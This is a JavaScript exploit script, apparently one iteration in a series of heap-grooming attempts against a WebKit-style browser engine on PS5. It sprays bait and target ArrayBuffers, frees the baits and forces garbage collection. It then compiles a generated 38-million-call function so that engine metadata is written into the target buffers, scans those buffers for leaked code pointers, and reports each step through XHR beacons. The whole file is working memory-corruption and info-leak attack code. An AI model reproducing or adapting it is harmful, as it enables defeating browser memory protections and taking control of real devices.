// p150m — Bait-and-switch: guaranteed low-address metadata via FinalizationRegistry
//
// Why Worker spray failed (p150j RESULT-0h-0nz):
// marge bitfit allocates lowest-address first. Worker ABs fill low addresses.
// Metadata buffer goes ABOVE them. Forward sweep goes even higher. No hits.
//
// Fix: allocate BAITS (low address) → allocate TARGETS (high address) →
// free BAITS → GC returns backing stores to free list →
// metadata buffer fills a freed bait hole → sweep reaches TARGETS.
//
// Key improvement over p150h/p150i: FinalizationRegistry confirms GC collected baits.
// Beacon prefix: V150M-
(function() {
  function BS(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', '/beacon/V150M-' + tag + '?t=' + Date.now(), false);
      x.send();
    } catch (e) {}
  }

  BS('BOOT');

  var BUF_SIZE = 100096;
  var BAIT_COUNT = 300;
  var TARGET_COUNT = 300;

  // Phase 1: Allocate BAITS (fill low-address marge bitfit slots)
  var baits = new Array(BAIT_COUNT);
  for (var i = 0; i < BAIT_COUNT; i++) {
    baits[i] = new ArrayBuffer(BUF_SIZE);
  }
  BS('BAITS-' + BAIT_COUNT);

  // Phase 2: Allocate TARGETS (fill higher-address slots)
  var targets = new Array(TARGET_COUNT);
  var tViews = new Array(TARGET_COUNT);
  for (var i = 0; i < TARGET_COUNT; i++) {
    targets[i] = new ArrayBuffer(BUF_SIZE);
    tViews[i] = new Uint32Array(targets[i]);
  }
  BS('TARGETS-' + TARGET_COUNT);

  // Phase 3: Track bait collection with FinalizationRegistry
  var collected = 0;
  var registry = new FinalizationRegistry(function() { collected++; });

  // Register baits for GC tracking, then release them
  for (var i = 0; i < BAIT_COUNT; i++) {
    var sentinel = {};
    registry.register(sentinel, i);
    // Intentionally let sentinel go out of scope each iteration
  }

  // Release all bait references
  for (var i = 0; i < BAIT_COUNT; i++) {
    baits[i] = null;
  }
  baits = null;
  BS('FREED-BAITS');

  // Phase 4: AGGRESSIVE GC — force Full GC to reclaim bait backing stores
  // Eden GC won't collect old-gen objects. Need heavy allocation pressure
  // to trigger Full GC. On PS5, Full GC fires when heap exceeds ~2x live size.

  // Round 1: Large AB churn (triggers marge bitfit deallocation notices)
  for (var round = 0; round < 5; round++) {
    var tmp = [];
    for (var g = 0; g < 80; g++) {
      try { tmp.push(new ArrayBuffer(512 * 1024)); } catch(e) { break; }
    }
    tmp = null;
  }

  // Round 2: Small object churn (triggers Eden GC repeatedly)
  for (var g = 0; g < 300000; g++) {
    var obj = {a: g, b: [g], c: String(g)};
  }

  // Round 3: More large ABs (another wave)
  for (var round = 0; round < 3; round++) {
    var tmp2 = [];
    for (var g = 0; g < 50; g++) {
      try { tmp2.push(new ArrayBuffer(1024 * 1024)); } catch(e) { break; }
    }
    tmp2 = null;
  }

  // Round 4: Force FinalizationRegistry cleanup tasks to run
  // These fire as microtasks after GC. Yield to event loop briefly.
  // But we're synchronous, so just do more pressure + check.
  for (var g = 0; g < 100000; g++) {
    var obj2 = {x: g};
  }

  BS('GC-DONE-COL-' + collected);

  // Verify targets are still alive and zeroed
  var alive = 0, preNZ = 0;
  for (var i = 0; i < TARGET_COUNT; i++) {
    if (targets[i] && targets[i].byteLength > 0) {
      alive++;
      for (var j = 0; j < 50; j++) {
        if (tViews[i][j] !== 0) preNZ++;
      }
    }
  }
  BS('ALIVE-' + alive + '-PRENZ-' + preNZ);

  // Phase 5: Compile the 38M-call function
  // Metadata buffer should fill a freed bait hole (low address)
  // finishCreation() sweep goes forward through target ABs (high addresses)
  var N = 38348816;
  var CHUNK = 4000000;
  var chunksN = Math.floor(N / CHUNK);
  var rem = N - chunksN * CHUNK;
  var callChunk = 'a();'.repeat(CHUNK);
  var parts = new Array(chunksN + 3);
  parts[0] = 'window.__bigFn=function(a){';
  for (var c = 0; c < chunksN; c++) parts[1 + c] = callChunk;
  parts[chunksN + 1] = 'a();'.repeat(rem);
  parts[chunksN + 2] = '};window.__bigOk=1;';
  callChunk = null;

  var blob = new Blob(parts, {type: 'application/javascript'});
  BS('BLOB-' + Math.round(blob.size / 1048576) + 'MB');
  parts = null;

  var url = URL.createObjectURL(blob);
  var sc = document.createElement('script');
  sc.onerror = function() { BS('SCRIPT-ERR'); };
  sc.onload = function() {
    blob = null;
    URL.revokeObjectURL(url);
    BS('COMPILED-' + (window.__bigOk ? 'OK' : 'FAIL'));
    if (!window.__bigOk) return;

    // Phase 6: Scan TARGETS for non-zero data
    BS('SCAN-START');
    var hitBufs = 0, totalNZ = 0, reported = 0;

    for (var i = 0; i < TARGET_COUNT; i++) {
      if (!targets[i] || !tViews[i]) continue;
      var v = tViews[i];
      var nz = 0;
      for (var j = 0; j < v.length; j++) {
        if (v[j] !== 0) nz++;
      }
      if (nz > 0) {
        hitBufs++;
        totalNZ += nz;
        if (reported < 20) {
          var ct = 0;
          for (var k = 0; k < v.length && ct < 3; k++) {
            if (v[k] !== 0) {
              BS('L-b' + i + '-o' + (k*4) + '-' + v[k].toString(16));
              ct++; reported++;
            }
          }
        }
      }
    }
    BS('HITS-' + hitBufs + '-NZ-' + totalNZ);

    // Phase 7: If hits, extract code pointers
    if (hitBufs > 0) {
      var ptrs = 0;
      for (var i = 0; i < TARGET_COUNT && ptrs < 10; i++) {
        if (!targets[i]) continue;
        var u8 = new Uint8Array(targets[i]);
        for (var j = 0; j < u8.length - 7 && ptrs < 10; j += 8) {
          var hi = (u8[j+7] << 8) | u8[j+6];
          var mid = (u8[j+5] << 8) | u8[j+4];
          if (hi === 0 && mid !== 0) {
            var hex = '';
            for (var x = 7; x >= 0; x--) hex += ('0' + u8[j+x].toString(16)).slice(-2);
            BS('PTR-b' + i + '-o' + j + '-' + hex);
            ptrs++;
          }
        }
      }
      BS('PTRS-' + ptrs);

      // Dump 112 bytes at first non-zero position for stride analysis
      for (var i = 0; i < TARGET_COUNT; i++) {
        if (!tViews[i]) continue;
        var v = tViews[i];
        var fst = -1;
        for (var j = 0; j < v.length; j++) {
          if (v[j] !== 0) { fst = j; break; }
        }
        if (fst < 0) continue;
        var d = '';
        for (var dd = 0; dd < 28 && (fst+dd) < v.length; dd++) {
          if (dd) d += ',';
          d += v[fst+dd].toString(16);
        }
        BS('DUMP-b' + i + '-o' + (fst*4) + '-' + d);

        // Check 112-byte stride repetition
        var match = 0;
        for (var off = fst; (off+28) + 28 < v.length; off += 28) {
          var same = true;
          for (var b = 0; b < 7; b++) {
            if (v[off + b] !== v[off + 28 + b]) { same = false; break; }
          }
          if (same) match++;
        }
        BS('STRIDE-' + match);
        break;
      }
    }

    BS('DONE');
  };
  document.head.appendChild(sc);
  sc.src = url;
})();
